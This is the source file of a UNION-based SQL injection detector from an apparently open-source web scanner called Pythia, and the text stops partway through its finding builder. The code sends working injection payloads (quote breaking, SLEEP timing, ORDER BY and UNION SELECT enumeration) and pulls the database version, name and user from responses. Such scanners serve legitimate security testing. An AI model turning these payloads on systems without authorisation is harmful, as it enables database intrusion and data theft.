"""
Pythia UNION-Based SQL Injection Detection
==========================================
⚠️ AGGRESSIVE MODE ONLY ⚠️
Author: Rodney Dhavid Jimenez Chacin (rodhnin)
License: MIT
"""
import re
import random
import time
from typing import List, Dict, Optional, Tuple
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ..core.logging import get_logger
from ..core.config import get_config

logger = get_logger(__name__)


class UnionBasedDetector:
    """
    UNION-based SQL injection detector with string context detection.
    """
    
    def __init__(self, config, http_client, auto_csrf: bool = False):
        """Initialize UNION-based detector."""
        self.config = config
        self.http = http_client
        self.auto_csrf = auto_csrf
        
        from .forms import FormTester
        self.form_tester = FormTester(config, http_client, auto_csrf)
        logger.debug("FormTester imported for URL merging support")
        
        # Load configuration
        self.max_columns = getattr(config, 'sqli_union_max_columns', 10)
        self.extract_info = getattr(config, 'sqli_union_extract_basic_info', True)
        
        # SQL error patterns for detection
        self.error_patterns = self._get_error_patterns()
        
        # Compile regex patterns
        self.compiled_patterns = [
            re.compile(pattern, re.IGNORECASE)
            for pattern in self.error_patterns
        ]
        
        logger.info("UNION-based detector initialized")
        logger.info(f"  Max columns to test: {self.max_columns}")
        logger.info(f"  Extract basic info: {self.extract_info}")
        logger.info(f"  SQL context verification: ENABLED")
        logger.info(f"  String context detection: ENABLED")
        logger.info(f"  Baseline comparison: ENABLED")
        logger.info(f"  False positive prevention: ENABLED")
        logger.info(f"  URL merging: ENABLED (imported from forms.py)")
        logger.warning("⚠️  UNION-BASED TESTING IS AGGRESSIVE")
    
    def _get_error_patterns(self) -> List[str]:
        """Get SQL error patterns for detection."""
        return [
            # MySQL
            r"You have an error in your SQL syntax",
            r"Warning: mysql_",
            r"The used SELECT statements have a different number of columns",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"each UNION query must have the same number of columns",
            
            # MSSQL
            r"All queries combined using a UNION.*must have an equal number of expressions",
            
            # Oracle
            r"ORA-01789",
            
            # Generic
            r"number of columns",
            r"column.*mismatch",
        ]
    
    def _has_sql_error(self, response) -> bool:
        """Check if response contains SQL error."""
        try:
            response_text = response.text
        except:
            return False
        
        for i, pattern in enumerate(self.compiled_patterns):
            match = pattern.search(response_text)
            if match:
                logger.debug(f"SQL error pattern #{i} matched: '{match.group(0)[:50]}'")
                return True
        
        return False
    
    def _make_request(
        self,
        base_url: str,
        params_or_data: Dict[str, str],
        method: str = 'GET',
        is_path_param: bool = False,
        param_name: str = None,
        param_position: int = None
    ):
        """
        Helper method to make HTTP requests with correct method.
        """
        method_upper = method.upper()
        
        # ================================================================
        # PATH PARAMETER INJECTION
        # ================================================================
        if is_path_param and param_name:
            payload_value = params_or_data.get(param_name, '')
            
            parsed = urlparse(base_url)
            path_segments = [seg for seg in parsed.path.split('/') if seg]
            
            if param_position:
                target_index = param_position
                while len(path_segments) <= target_index:
                    path_segments.append('')
                path_segments[target_index] = payload_value
            else:
                path_segments.append(payload_value)
            
            new_path = '/' + '/'.join(path_segments)
            
            injected_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                new_path,
                parsed.params,
                parsed.query,
                parsed.fragment
            ))
            
            clean_params = {k: v for k, v in params_or_data.items() if k != param_name}
            
            logger.debug(f"Path param injection: {injected_url}")
            
            if method_upper == 'POST':
                return self.http.post(injected_url, data=clean_params, allow_redirects=True)
            else:
                return self.http.get(injected_url, params=clean_params, allow_redirects=True)
        
        # ================================================================
        # QUERY STRING INJECTION
        # ================================================================
        if method_upper == 'POST':
            return self.http.post(base_url, data=params_or_data, allow_redirects=True)
        else:
            clean_url = self.form_tester._merge_url_and_params(base_url, params_or_data)
            
            logger.debug(f"[UNION] Merged URL: {clean_url}")
            
            return self.http.get(clean_url, allow_redirects=True)
    
    # ====================================================================
    # SQL CONTEXT VERIFICATION
    # ====================================================================
    def _verify_sql_context(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        all_params: Dict[str, str],
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> bool:
        """
        Verify that parameter is actually in a SQL query.
        """
        logger.debug(f"Verifying SQL context for parameter: {param_name}")
        
        # ================================================================
        # TEST 1: Single quote should cause SQL error
        # ================================================================
        try:
            test_params = all_params.copy() if all_params else {}
            test_params[param_name] = f"{original_value}'"
            
            response = self._make_request(
                base_url,
                test_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            
            if self._has_sql_error(response):
                logger.info("✓ SQL context CONFIRMED (single quote caused SQL error)")
                return True
        except Exception as e:
            logger.debug(f"Error during SQL error test: {e}")
        
        # ================================================================
        # TEST 2: Timing-based detection (SLEEP)
        # ================================================================
        try:
            test_params = all_params.copy() if all_params else {}
            
            # Get baseline timing
            start = time.time()
            baseline_response = self._make_request(
                base_url,
                test_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            baseline_time = time.time() - start
            
            # Test with SLEEP payload
            test_params[param_name] = f"{original_value}' AND SLEEP(1)--"
            
            start = time.time()
            delayed_response = self._make_request(
                base_url,
                test_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            delayed_time = time.time() - start
            
            time_diff = delayed_time - baseline_time
            
            if time_diff > 0.9:
                logger.info(f"✓ SQL context CONFIRMED (timing difference: {time_diff:.2f}s)")
                return True
        except Exception as e:
            logger.debug(f"Error during timing test: {e}")
        
        # ================================================================
        # NO SQL CONTEXT DETECTED
        # ================================================================
        logger.info("✗ NO SQL context detected")
        logger.info(f"   Parameter '{param_name}' is likely NOT in a SQL query")
        logger.info("   This may be a routing parameter or non-SQL parameter")
        return False
    
    def _detect_string_context(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        all_params: Dict[str, str],
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> bool:
        """
        Detect if parameter is in string context (wrapped in quotes in SQL).
        
        This is critical for UNION-based detection because:
        - String context: WHERE id='1' → Need to close quote: 1' UNION...
        - Numeric context: WHERE id=1 → No quote needed: 1 UNION...
        
        Tests:
        - String context: 1' AND '1'='1 should work (closes quote, adds condition)
        - Numeric context: 1 AND 1=1 should work (no quote needed)
        
        Returns:
            True if string context (quotes in SQL)
            False if numeric context (no quotes in SQL)
        """
        logger.debug(f"Detecting SQL context type for parameter: {param_name}")
        
        # Get baseline first
        try:
            baseline_params = all_params.copy() if all_params else {}
            baseline_params[param_name] = original_value
            
            baseline_response = self._make_request(
                base_url,
                baseline_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            
            baseline_size = len(baseline_response.text)
            baseline_status = baseline_response.status_code
        except Exception as e:
            logger.debug(f"Error getting baseline: {e}")
            # If baseline fails, assume string context (safer)
            return True
        
        # ================================================================
        # TEST 1: String context - close quote and add condition
        # ================================================================
        try:
            test_params = all_params.copy() if all_params else {}
            test_params[param_name] = f"{original_value}' AND '1'='1"
            
            response = self._make_request(
                base_url,
                test_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            
            # If no error and similar response → string context works
            if (response.status_code == 200 and 
                not self._has_sql_error(response) and
                abs(len(response.text) - baseline_size) < 100):
                logger.info(f"✓ Detected STRING CONTEXT for '{param_name}' (value wrapped in quotes in SQL)")
                logger.debug(f"   SQL likely looks like: WHERE {param_name}='{original_value}'")
                return True
            else:
                logger.debug(f"   String context test did not match baseline (status={response.status_code}, has_error={self._has_sql_error(response)})")
        
        except Exception as e:
            logger.debug(f"Error during string context test: {e}")
        
        # ================================================================
        # TEST 2: Numeric context - no quotes needed
        # ================================================================
        try:
            test_params = all_params.copy() if all_params else {}
            test_params[param_name] = f"{original_value} AND 1=1"
            
            response = self._make_request(
                base_url,
                test_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            
            # If no error and similar response → numeric context works
            if (response.status_code == 200 and 
                not self._has_sql_error(response) and
                abs(len(response.text) - baseline_size) < 100):
                logger.info(f"✓ Detected NUMERIC CONTEXT for '{param_name}' (no quotes in SQL)")
                logger.debug(f"   SQL likely looks like: WHERE {param_name}={original_value}")
                return False
            else:
                logger.debug(f"   Numeric context test did not match baseline (status={response.status_code}, has_error={self._has_sql_error(response)})")
        
        except Exception as e:
            logger.debug(f"Error during numeric context test: {e}")
        
        # ================================================================
        # DEFAULT: Assume string context (safer)
        # ================================================================
        logger.warning(f"⚠ Could not definitively detect context type - defaulting to STRING CONTEXT")
        logger.warning(f"   This is safer as most parameters are in string context")
        return True
    
    def _is_numeric_context(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        is_path_param: bool
    ) -> bool:
        """
        DEPRECATED: Use _detect_string_context() instead.
        Kept for backwards compatibility.
        """
        try:
            int(original_value)
            logger.debug(f"✓ Parameter '{param_name}' value is NUMERIC (but may still be in string context)")
            return True
        except ValueError:
            logger.debug(f"✗ Parameter '{param_name}' is not numeric")
            return False
    
    def _detect_escaping_protection(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        all_params: Dict[str, str],
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> bool:
        """Detect if application uses mysqli_real_escape_string or similar."""
        try:
            test_params = all_params.copy() if all_params else {}
            test_params[param_name] = "' OR '1'='1"
            
            response = self._make_request(
                base_url,
                test_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            
            if r"\'" in response.text or r"\\'" in response.text:
                logger.info("✓ Detected mysqli_real_escape_string() - will use numeric payloads")
                return True
            
            if "\\'" in response.text or "\\\\" in response.text:
                logger.info("✓ Detected string escaping - will use numeric payloads")
                return True
        except Exception as e:
            logger.debug(f"Error during escaping detection: {e}")
        
        return False
    
    def _enumerate_columns(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        all_params: Dict[str, str] = None,
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> Optional[int]:
        """
        Enumerate number of columns using ORDER BY + UNION SELECT validation.
        """
        logger.debug(f"Enumerating columns for parameter: {param_name} (method={method})")
        
        # ================================================================
        # DETECT STRING CONTEXT
        # ================================================================
        string_context = self._detect_string_context(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        # Phase 1: Try ORDER BY
        for column_count in range(1, self.max_columns + 1):
            try:
                # ============================================================
                # BUILD PAYLOAD WITH PROPER CONTEXT
                # ============================================================
                if string_context:
                    # String context: close quote first
                    payload = f"{original_value}' ORDER BY {column_count}-- "
                    logger.debug(f"  Testing ORDER BY {column_count} with string closure: {payload[:50]}...")
                else:
                    # Numeric context: no quotes needed
                    payload = f"{original_value} ORDER BY {column_count}-- "
                    logger.debug(f"  Testing ORDER BY {column_count} with numeric context: {payload[:50]}...")
                
                test_params = all_params.copy() if all_params else {}
                test_params[param_name] = payload
                
                response = self._make_request(
                    base_url,
                    test_params,
                    method,
                    is_path_param=is_path_param,
                    param_name=param_name,
                    param_position=param_position
                )
                
                if self._has_sql_error(response) or response.status_code >= 500:
                    num_columns = column_count - 1
                    
                    if num_columns > 0:
                        logger.info(f"✓ Column count detected via ORDER BY: {num_columns} columns")
                        return num_columns
                    else:
                        logger.info("ORDER BY 1 caused error - cannot determine columns")
                        return None
                
                logger.debug(f"  ORDER BY {column_count}: No error")
            
            except Exception as e:
                logger.error(f"Error enumerating columns: {e}")
                return None
        
        # Phase 2: Reached max without error → Use UNION SELECT to find exact count
        logger.info(f"ORDER BY {self.max_columns} did not fail - using UNION SELECT validation")
        
        num_columns = self._find_columns_via_union(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        return num_columns
    
    def _find_columns_via_union(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        all_params: Dict[str, str] = None,
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> Optional[int]:
        """
        Find exact column count using UNION SELECT with smart validation.
        """
        logger.debug("Finding exact column count via UNION SELECT...")
        
        string_context = self._detect_string_context(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        # Backwards compatibility: check old numeric detection
        is_numeric = False
        try:
            int(original_value)
            is_numeric = True
        except ValueError:
            pass
        
        has_escaping = False
        if not is_numeric:
            has_escaping = self._detect_escaping_protection(
                base_url,
                param_name,
                original_value,
                all_params,
                method,
                is_path_param=is_path_param,
                param_position=param_position
            )
        
        # Track response sizes to detect identical responses
        successful_tests = []  # (column_count, response_size, response_hash)
        
        # Try descending from max_columns to 1
        for column_count in range(self.max_columns, 0, -1):
            try:
                nulls = ','.join(['NULL'] * column_count)
                
                if string_context:
                    # String context: close quote, add UNION, comment out rest
                    payload = f"{original_value}' UNION SELECT {nulls}-- "
                    logger.debug(f"  Testing UNION {column_count} cols with string closure")
                elif has_escaping:
                    # Has escaping: use numeric context
                    payload = f"{original_value} UNION SELECT {nulls}#"
                    logger.debug(f"  Testing UNION {column_count} cols with escaping bypass")
                else:
                    # Numeric context: no quotes needed
                    payload = f"-1 UNION SELECT {nulls}#"
                    logger.debug(f"  Testing UNION {column_count} cols with numeric context")
                
                test_params = all_params.copy() if all_params else {}
                test_params[param_name] = payload
                
                response = self._make_request(
                    base_url,
                    test_params,
                    method,
                    is_path_param=is_path_param,
                    param_name=param_name,
                    param_position=param_position
                )
                
                has_error = self._has_sql_error(response)
                
                if response.status_code == 200 and not has_error:
                    # Calculate simple hash of response
                    response_hash = hash(response.text[:1000])  # First 1000 chars
                    response_size = len(response.text)
                    
                    successful_tests.append((column_count, response_size, response_hash))
                    logger.debug(f"  UNION SELECT with {column_count} columns: Success (size={response_size})")
                else:
                    logger.debug(f"  UNION SELECT with {column_count} columns: Failed")
            
            except Exception as e:
                logger.error(f"Error testing UNION with {column_count} columns: {e}")
                continue
        
        # VALIDATE RESPONSES ARE DIFFERENT
        if not successful_tests:
            logger.info("Could not determine column count via UNION SELECT")
            return None
        
        # Check if all responses are identical
        response_hashes = [h for _, _, h in successful_tests]
        unique_hashes = set(response_hashes)
        
        if len(unique_hashes) == 1 and len(successful_tests) > 1:
            logger.info("✗ ALL UNION payloads returned IDENTICAL responses")
            logger.info("   This indicates parameter is NOT in SQL query")
            logger.info("   Likely a routing parameter or non-SQL parameter")
            return None
        
        # Return the first successful count (highest column count that worked)
        column_count = successful_tests[0][0]
        logger.info(f"✓ Column count confirmed via UNION SELECT: {column_count} columns")
        return column_count
    
    def _test_union_select(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        num_columns: int,
        all_params: Dict[str, str] = None,
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> bool:
        """
        Test if UNION SELECT works with unique markers for data extraction verification.
        """
        logger.debug(f"Testing UNION SELECT with {num_columns} columns (method={method})")
        
        try:

            # GET BASELINE RESPONSE
            baseline_params = all_params.copy() if all_params else {}
            baseline_params[param_name] = original_value
            
            baseline = self._make_request(
                base_url,
                baseline_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            
            if not baseline or baseline.status_code != 200:
                logger.debug("Baseline request failed - skipping UNION test")
                return False
            
            baseline_text = baseline.text
            baseline_size = len(baseline_text)
            
            # DETECT CONTEXT
            string_context = self._detect_string_context(
                base_url,
                param_name,
                original_value,
                all_params,
                method,
                is_path_param=is_path_param,
                param_position=param_position
            )
            
            # Backwards compatibility
            is_numeric = False
            try:
                int(original_value)
                is_numeric = True
            except ValueError:
                pass
            
            has_escaping = False
            if not is_numeric:
                has_escaping = self._detect_escaping_protection(
                    base_url,
                    param_name,
                    original_value,
                    all_params,
                    method,
                    is_path_param=is_path_param,
                    param_position=param_position
                )
            
            test_markers = []
            values = []
            
            for i in range(1, num_columns + 1):
                if string_context:
                    # String context: use quoted string markers
                    marker = f"PYTHIA{random.randint(10000, 99999)}"
                    test_markers.append(marker)
                    values.append(f"'{marker}'")
                else:
                    # Numeric context: use UNQUOTED number markers (no quotes!)
                    marker = random.randint(87654321, 98765432)
                    test_markers.append(str(marker))
                    values.append(str(marker))  # ← SIN COMILLAS
            
            # Build final payload based on context
            if string_context:
                # String context: close quote, add UNION
                payload = f"{original_value}' UNION SELECT {','.join(values)}-- "
                logger.debug(f"Testing with STRING CONTEXT payload")
            elif has_escaping:
                # Has escaping: use numeric
                payload = f"{original_value} UNION SELECT {','.join(values)}#"
                logger.debug(f"Testing with ESCAPING BYPASS payload")
            else:
                # Numeric context
                payload = f"-1 UNION SELECT {','.join(values)}#"
                logger.debug(f"Testing with NUMERIC CONTEXT payload")
            
            logger.debug(f"Testing with markers: {test_markers[:3]}... (showing first 3)")
            
            # SEND PAYLOAD
            test_params = all_params.copy() if all_params else {}
            test_params[param_name] = payload
            
            response = self._make_request(
                base_url,
                test_params,
                method,
                is_path_param=is_path_param,
                param_name=param_name,
                param_position=param_position
            )
            
            # VERIFY DATA EXTRACTION
            if response.status_code == 200 and not self._has_sql_error(response):
                payload_text = response.text
                payload_size = len(payload_text)
                
                # Count how many markers were successfully extracted
                found_markers = [m for m in test_markers if m in payload_text]
                
                if len(found_markers) >= 1:
                    # SUCCESS: At least one marker was extracted
                    logger.info(
                        f"✓ UNION SELECT confirmed working - "
                        f"{len(found_markers)}/{num_columns} markers extracted"
                    )
                    return True
                
                else:
                    # No markers found - check size difference as fallback
                    size_diff = abs(baseline_size - payload_size)
                    
                    if size_diff > 100:
                        logger.info(
                            f"⚠ UNION SELECT may work (size diff: {size_diff} bytes) "
                            f"but NO markers extracted"
                        )
                        logger.info(
                            "   This could indicate blind UNION SQLi or non-visible columns"
                        )
                        # Consider it vulnerable but will need low confidence
                        return True
                    else:
                        logger.info(
                            f"✗ UNION payload had NO EFFECT "
                            f"(no markers extracted, minimal size diff: {size_diff} bytes)"
                        )
                        logger.info("   Parameter likely NOT in SQL query")
                        return False
            else:
                logger.debug("UNION SELECT failed or caused error")
                return False
        
        except Exception as e:
            logger.error(f"Error testing UNION SELECT: {e}")
            return False
    
    def _identify_injectable_columns(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        num_columns: int,
        all_params: Dict[str, str] = None,
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> List[int]:
        """
        Identify which columns accept string values with data extraction verification.
        """
        logger.debug("Identifying injectable columns with data extraction verification...")
        
        # DETECT STRING CONTEXT
        string_context = self._detect_string_context(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        # Backwards compatibility
        is_numeric = False
        try:
            int(original_value)
            is_numeric = True
        except ValueError:
            pass
        
        has_escaping = False
        if not is_numeric:
            has_escaping = self._detect_escaping_protection(
                base_url,
                param_name,
                original_value,
                all_params,
                method,
                is_path_param=is_path_param,
                param_position=param_position
            )
        
        injectable = []
        
        for col_idx in range(1, num_columns + 1):
            try:

                # BUILD PAYLOAD BASED ON CONTEXT
                if string_context:
                    # String context: use quoted string markers
                    test_marker = f"PYTHIA{random.randint(10000, 99999)}"
                    values = []
                    for i in range(1, num_columns + 1):
                        if i == col_idx:
                            values.append(f"'{test_marker}'")
                        else:
                            values.append("NULL")
                else:
                    # Numeric context: use UNQUOTED number markers (NO QUOTES!)
                    test_marker = random.randint(87654321, 98765432)
                    values = []
                    for i in range(1, num_columns + 1):
                        if i == col_idx:
                            values.append(str(test_marker))
                        else:
                            values.append("NULL")
                
                # Convert marker to string for searching
                test_marker_str = str(test_marker)
                
                # BUILD FINAL PAYLOAD
                if string_context:
                    payload = f"{original_value}' UNION SELECT {','.join(values)}-- "
                    logger.debug(f"  Testing column {col_idx} with STRING CONTEXT (marker: {test_marker_str})")
                elif has_escaping:
                    payload = f"{original_value} UNION SELECT {','.join(values)}-- "
                    logger.debug(f"  Testing column {col_idx} with ESCAPING BYPASS (marker: {test_marker_str})")
                else:
                    payload = f"{original_value} UNION SELECT {','.join(values)}-- "
                    logger.debug(f"  Testing column {col_idx} with NUMERIC CONTEXT (marker: {test_marker_str})")
                
                test_params = all_params.copy() if all_params else {}
                test_params[param_name] = payload
                
                response = self._make_request(
                    base_url,
                    test_params,
                    method,
                    is_path_param=is_path_param,
                    param_name=param_name,
                    param_position=param_position
                )
                
                if response.status_code == 200 and not self._has_sql_error(response):
                    if test_marker_str in response.text:
                        injectable.append(col_idx)
                        logger.info(f"  ✓ Column {col_idx}: INJECTABLE (marker '{test_marker_str}' extracted)")
                    else:
                        logger.debug(f"  ✗ Column {col_idx}: UNION works but NO DATA EXTRACTION")
                else:
                    logger.debug(f"  ✗ Column {col_idx}: Not injectable (error or bad status)")
            
            except Exception as e:
                logger.error(f"Error testing column {col_idx}: {e}")
                continue
        
        if injectable:
            logger.info(f"✓ Injectable columns with CONFIRMED data extraction: {injectable}")
        else:
            logger.warning("✗ NO injectable columns with data extraction found")
            logger.warning("   UNION SELECT may work but data is NOT visible in response")
            logger.warning("   This is likely a FALSE POSITIVE or true blind SQLi")
        
        return injectable
    
    def _extract_from_response(self, response_text: str, injectable_col: int) -> Optional[str]:
        """Extract data from DVWA-style response HTML."""
        import re
        
        if injectable_col == 1:
            match = re.search(r'First name:\s*([^<\n]+)', response_text, re.IGNORECASE)
        else:
            match = re.search(r'Surname:\s*([^<\n]+)', response_text, re.IGNORECASE)
        
        if match:
            value = match.group(1).strip()
            if value and value not in ['', 'NULL', 'null', 'admin']:
                return value
        
        pre_pattern = r'<pre>.*?</pre>'
        pre_matches = re.findall(pre_pattern, response_text, re.DOTALL | re.IGNORECASE)
        
        for pre_content in pre_matches:
            if injectable_col == 1:
                match = re.search(r'First name:\s*([^<\n]+)', pre_content, re.IGNORECASE)
            else:
                match = re.search(r'Surname:\s*([^<\n]+)', pre_content, re.IGNORECASE)
            
            if match:
                value = match.group(1).strip()
                if value and value not in ['', 'NULL', 'null', 'admin']:
                    return value
        
        return None
    
    def _extract_basic_info(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        num_columns: int,
        injectable_col: int,
        all_params: Dict[str, str] = None,
        method: str = 'GET',
        is_path_param: bool = False,
        param_position: int = None
    ) -> Dict[str, str]:
        """
        Extract basic database information (non-sensitive).
        """
        if not self.extract_info:
            logger.debug("Info extraction disabled in config")
            return {}
        
        logger.debug("Extracting basic database information...")
        
        # DETECT STRING CONTEXT
        string_context = self._detect_string_context(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        # Backwards compatibility
        is_numeric = False
        try:
            int(original_value)
            is_numeric = True
        except ValueError:
            pass
        
        extracted = {}
        
        info_queries = {
            'dbms_version': [
                ('@@version', 1),
                ('version()', 1),
                ('sqlite_version()', 1)
            ],
            'database_name': [
                ('database()', 2),
                ('current_database()', 2),
                ('db_name()', 2)
            ],
            'database_user': [
                ('user()', 1),
                ('current_user', 1),
                ('system_user', 1)
            ],
        }
        
        for info_key, query_list in info_queries.items():
            for query, preferred_col in query_list:
                try:
                    col_to_use = preferred_col if preferred_col <= num_columns else injectable_col
                    
                    values = []
                    for i in range(1, num_columns + 1):
                        if i == col_to_use:
                            values.append(query)
                        else:
                            values.append("NULL")
                    
                    # BUILD PAYLOAD BASED ON CONTEXT
                    if string_context:
                        payload = f"{original_value}' UNION SELECT {','.join(values)}-- "
                    else:
                        payload = f"-1 UNION SELECT {','.join(values)}#"
                    
                    test_params = all_params.copy() if all_params else {}
                    test_params[param_name] = payload
                    
                    response = self._make_request(
                        base_url,
                        test_params,
                        method,
                        is_path_param=is_path_param,
                        param_name=param_name,
                        param_position=param_position
                    )
                    
                    if response.status_code == 200 and not self._has_sql_error(response):
                        extracted_value = self._extract_from_response(
                            response.text,
                            col_to_use
                        )
                        
                        if extracted_value:
                            if info_key == 'dbms_version':
                                if re.search(r'\d+\.\d+', extracted_value):
                                    extracted[info_key] = extracted_value
                                    logger.info(f"✓ Extracted {info_key}: {extracted_value}")
                                    break
                            
                            elif info_key == 'database_name':
                                if (re.match(r'^[a-zA-Z_][a-zA-Z0-9_]{0,63}$', extracted_value) and
                                    extracted_value.upper() not in ['DOCTYPE', 'HTML', 'HEAD', 'BODY', 'DIV', 'NULL']):
                                    extracted[info_key] = extracted_value
                                    logger.info(f"✓ Extracted {info_key}: {extracted_value}")
                                    break
                            
                            elif info_key == 'database_user':
                                if re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*(@[a-zA-Z0-9._-]+)?$', extracted_value):
                                    extracted[info_key] = extracted_value
                                    logger.info(f"✓ Extracted {info_key}: {extracted_value}")
                                    break
                        else:
                            logger.debug(f"  Query '{query}' executed but value not extracted")
                
                except Exception as e:
                    logger.error(f"Error extracting {info_key} with {query}: {e}")
                    continue
        
        if extracted:
            logger.info(f"✓ Information extracted: {list(extracted.keys())}")
        else:
            logger.debug("No information extracted (may be hidden in response)")
        
        return extracted
    
    def test_url_parameter(
        self,
        base_url: str,
        param_name: str,
        original_value: str,
        all_params: Dict[str, str] = None,
        method: str = 'GET',
        url_metadata: Dict = None
    ) -> List[Dict]:
        """
        Test a single URL parameter for UNION-based SQLi.
        """
        findings = []
        
        # Extract path param metadata
        is_path_param = False
        param_position = None
        path_template = None
        
        if url_metadata:
            is_path_param = url_metadata.get('is_path_param', False)
            param_position = url_metadata.get('param_position')
            path_template = url_metadata.get('path_template')
        
        logger.info(
            f"Testing UNION-based on parameter: {param_name}={original_value} "
            f"(method={method})"
        )
        
        # ================================================================
        # STEP 0 - VERIFY SQL CONTEXT FIRST
        # ================================================================
        if not self._verify_sql_context(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        ):
            logger.debug("❌ Parameter NOT in SQL context - skipping UNION detection")
            return findings
        
        # ================================================================
        # STEP 1: ENUMERATE COLUMNS
        # ================================================================
        num_columns = self._enumerate_columns(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        if not num_columns:
            logger.debug("Cannot enumerate columns - UNION detection failed")
            return findings
        
        # ================================================================
        # STEP 2: TEST UNION SELECT
        # ================================================================
        union_works = self._test_union_select(
            base_url,
            param_name,
            original_value,
            num_columns,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        if not union_works:
            logger.debug("UNION SELECT does not work - not vulnerable")
            return findings
        
        # ================================================================
        # STEP 3: DETECT CONTEXT
        # ================================================================
        string_context = self._detect_string_context(
            base_url,
            param_name,
            original_value,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        is_numeric = False
        try:
            int(original_value)
            is_numeric = True
        except ValueError:
            pass
        
        has_escaping = False
        if not is_numeric:
            has_escaping = self._detect_escaping_protection(
                base_url,
                param_name,
                original_value,
                all_params,
                method,
                is_path_param=is_path_param,
                param_position=param_position
            )
        
        # ================================================================
        # STEP 4: IDENTIFY INJECTABLE COLUMNS
        # ================================================================
        injectable_cols = self._identify_injectable_columns(
            base_url,
            param_name,
            original_value,
            num_columns,
            all_params,
            method,
            is_path_param=is_path_param,
            param_position=param_position
        )
        
        # ================================================================
        # STRICT VALIDATION - REJECT IF NO DATA EXTRACTION
        # ================================================================
        if not injectable_cols or len(injectable_cols) == 0:
            logger.warning("❌ NO DATA EXTRACTION confirmed - NOT reporting as vulnerable")
            logger.warning("   UNION SELECT works but markers are not visible")
            logger.warning("   This could be:")
            logger.warning("   1. False positive (parameter not in SQL)")
            logger.warning("   2. True blind SQLi (requires different techniques)")
            return findings  # Return empty list - do NOT report
        
        # ================================================================
        # STEP 5: EXTRACT BASIC INFO
        # ================================================================
        extracted_info = {}
        if injectable_cols and self.extract_info:
            first_injectable = injectable_cols[0]
            extracted_info = self._extract_basic_info(
                base_url,
                param_name,
                original_value,
                num_columns,
                first_injectable,
                all_params,
                method,
                is_path_param=is_path_param,
                param_position=param_position
            )
        
        # ================================================================
        # BUILD CLEAN URL FOR FINDING
        # ================================================================
        if is_path_param:
            # Path parameter: simple construction
            finding_url = f"{base_url}/{original_value}"
        else:
            # Query parameter: use ALL original params, update tested one
            params_for_url = all_params.copy() if all_params else {}
            params_for_url[param_name] = original_value
            
            # Build clean URL
            parsed = urlparse(base_url)
            new_query = urlencode(params_for_url, doseq=False)
            finding_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                '',
                new_query,
                ''
            ))
        
        logger.debug(f"[UNION] Clean finding URL: {finding_url}")
        
        # ================================================================
        # STEP 6: CREATE FINDING (only if data extraction confirmed)
        # ================================================================
        finding = self._create_finding(
            url=finding_url,
            parameter=param_name,
            original_value=original_value,
            num_columns=num_columns,
            injectable_columns=injectable_cols,
            extracted_info=extracted_info,
            method=method.upper(),
            has_escaping=has_escaping,
            is_numeric=is_numeric,
            string_context=string_context
        )
        
        findings.append(finding)
        logger.info(f"✓ UNION-based SQLi CONFIRMED in parameter '{param_name}' (data extraction VERIFIED)")
        
        return findings
    
    def _create_finding(
        self,
        url: str,
        parameter: str,
        original_value: str,
        num_columns: int,
        injectable_columns: List[int],
        extracted_info: Dict[str, str],
        method: str = 'GET',
        form_context: Optional[Dict] = None,
        has_escaping: bool = False,
        is_numeric: bool = False,
        string_context: bool = True
    ) -> Dict:
        """Create a finding dictionary for UNION-based SQLi."""
        finding_id = 'PYTHIA-SQL-030'
        title = "UNION-Based SQL Injection"
        
        if form_context:
            description = (
                f"UNION-based SQL injection vulnerability detected in form field '{parameter}'. "
                f"The application is vulnerable to UNION SELECT attacks, which allow attackers "
                f"to extract data from the database by appending UNION queries. "
                f"Detected {num_columns} columns in the original query."
            )
        else:
            description = (
                f"UNION-based SQL injection vulnerability detected in URL parameter '{parameter}'. "
                f"The application is vulnerable to UNION SELECT attacks, which allow attackers "
